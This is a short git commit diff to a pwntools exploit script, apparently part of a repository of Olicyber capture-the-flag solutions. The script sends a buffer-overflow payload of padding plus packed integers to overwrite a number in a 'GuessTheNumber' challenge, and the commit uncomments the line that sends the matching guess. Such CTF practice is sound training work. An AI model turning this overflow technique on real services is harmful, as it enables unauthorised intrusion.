1c40d2151ee910ee9d60d8e9932c7f0b35715573
Enea Maroncelli <mururabdul@gmail.com>
2025-02-05 22:55:05 +0100

    Update GuessTheNumber.py

--- Olicyber/ChallengeOlicyber/software/GuessTheNumber.py
+++ Olicyber/ChallengeOlicyber/software/GuessTheNumber.py
@@ -6,5 +6,5 @@ p.recvuntil(b'scores:')
 number = 1337
 p.sendline(b'a'*20 + p32(5) +(number).to_bytes(8))
 p.recvuntil(b"bout? Try to guess it!\n")
-# p.sendline((number).to_bytes(8))
+p.sendline((number).to_bytes(8))
 p.interactive()
